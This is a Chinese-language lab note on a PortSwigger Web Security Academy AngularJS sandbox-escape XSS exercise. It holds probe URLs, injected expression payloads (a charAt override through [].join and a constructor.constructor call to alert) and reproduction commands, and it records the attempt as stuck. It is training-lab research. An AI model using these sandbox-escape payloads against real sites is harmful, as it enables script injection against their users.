---
title: lab-angular-sandbox-escape-without-strings
---

# lab-angular-sandbox-escape-without-strings

> evidences: [[client-side-template-injection-family]]

- 题面:Reflected XSS with AngularJS sandbox escape without strings(/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
- 实例(批45R):https://0a27009d04926c3f8034171b00b000c7.web-security-academy.net
- 判定目标:逃逸沙箱执行 `alert`(不可用 `$eval`、不可用字符串);状态:**stuck**(批45R 推翻两条旧前提,未决面更锐利)

## 机制(实测生成代码)

```
<script>angular.module('labApp',[]).controller('vulnCtrl',function($scope,$parse){
  $scope.query = {};
  var key = '<参数名>'; $scope.query[key] = '<参数值>'; $scope.value = $parse(key)($scope.query);
  …每个参数一块… });
<h1 ng-controller=vulnCtrl>N search results for {{value}}</h1>
```

- **参数名 = 表达式**($parse 以 `$scope.query` 为 scope 求值);`{{value}}` 只是文本 sink。

## 关键事实(早期两条前提已否证)

1. **没有 `search` 参数 = 没有循环**:`?a=x`、`?[]=x` 等不带 `search` 的请求根本不生成 controller 脚本(响应 8512B,blog-header 段无 `<script>`)⇒ 任何省略 `search` 的探针都是无效样本(批38 部分探针存疑)。
2. **迭代顺序不是字典序,而是 Java HashMap 顺序**:`?search=1&a=zz&b=alert(1337)&a.constructor.prototype.charAt=[].join=x&constructor.constructor(b)()=x` 生成顺序 = `constructor.constructor(b)()` → `a` → `search` → `b` → `a.constructor.prototype.charAt=[].join`(**override 落到最后**)。想先 override 再 payload 必须逐 URL 探测顺序、或改键名碰 hash。
3. **参数值被 HTML 转义**:`b=xx'+alert(1337)+'xx` 生成 `$scope.query[key] = 'xx&apos;+alert(1337)+&apos;xx'` ⇒ 值破串(引号注入)**封死**。
4. **override 之后新编译的 getter 是坏的**:页面内 oracle——先 `$parse('a.constructor.prototype.charAt=[].join')({a:'zz'})`(生效,`String.prototype.charAt` 变 join),再 `$parse('constructor.constructor(b)()')({b:'alert(1337)'})` → JS `ReferenceError: b is not defined`(词法器/编译器自身依赖 charAt,被 override 后产出的取数函数是坏的)。即 payload 必须「过坏词法器」且「不含被 ensureSafe* 拦的直面」。

## 未决面

- 缺的原语:①一个在 override 之后仍能正确编译的执行式(现证 `constructor.constructor(<scope 变量>)()` 编译即坏);或 ②无需 override 就能过 ensureSafe 的执行式。
- 已证可用素材:override 本身、`[].join`、参数名里 `[ ] | ;` 原样放行、`$scope.query` 里任意键值可当字符串源(值不可含裸引号)。

## 证据摘录

```
生成代码顺序(见上 URL): constructor.constructor(b)() / a / search / b / a.constructor.prototype.charAt=[].join
值转义: $scope.query[key] = 'xx&apos;+alert(1337)+&apos;xx';
oracle: {"override":"ok","charAtIsJoin":true,"chain":"ERR:b is not defined"}
```

## 复现命令

```
range_launch launch D82E3A0C…C05390F1 --jar ~/.pi-rs/agent/chrome-jar.json
http_session get "https://<inst>/?search=1&a=zz&b=alert(1337)&a.constructor.prototype.charAt%3D%5B%5D.join=x&constructor.constructor%28b%29%28%29=x" --out /tmp/l3.html
text_grep 'var key' /tmp/l3.html        # 看生成顺序
```

## 关系

- 族:[[client-side-template-injection-family]](「参数名当表达式」行);沙箱表见 [[angularjs-1-4-4-sandbox-escape-practice-notes]]。
